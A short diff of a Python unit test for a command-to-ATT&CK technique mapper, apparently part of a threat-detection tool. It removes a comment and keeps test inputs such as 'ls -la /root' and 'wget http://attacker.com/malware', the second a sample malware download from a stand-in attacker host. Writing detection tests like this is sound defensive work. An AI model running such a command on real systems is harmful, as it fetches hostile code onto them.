@@ -8,7 +8,6 @@ class TestAADEAdvancedLogic(unittest.TestCase):
     def test_ttp_mapping(self):
         tags = map_command_to_ttpx("ls -la /root")
         self.assertTrue(any(t['id'] == 'T1083' for t in tags))
-        # Tool transfer
         tags = map_command_to_ttpx("wget http://attacker.com/malware")
         self.assertTrue(any(t['id'] == 'T1105' for t in tags))
 
